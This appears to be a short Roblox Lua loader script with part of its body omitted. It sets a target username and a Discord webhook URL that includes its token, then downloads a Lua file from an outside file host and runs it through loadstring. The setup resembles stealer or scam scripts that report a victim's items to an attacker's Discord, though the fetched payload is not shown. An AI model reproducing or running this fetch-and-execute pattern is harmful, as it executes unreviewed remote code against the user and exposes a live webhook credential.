-- Mode: CUSTOM
getgenv().TARGET_USERNAME = "teo_dmp"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1552116771215904780/kPUMlMatwnwc8CVXQPLuFVP5SUsVsLE0cHzOIwPeTwEH4q_KaWCMng1yIPL2_9tyDEYL"
...
task.spawn(function()
    loadstring(game:HttpGet("https://files.manuscdn.com/user_upload_by_module/session_file/310519663887233946/tPOcSfCdpiFDQdnz.lua"))()
end)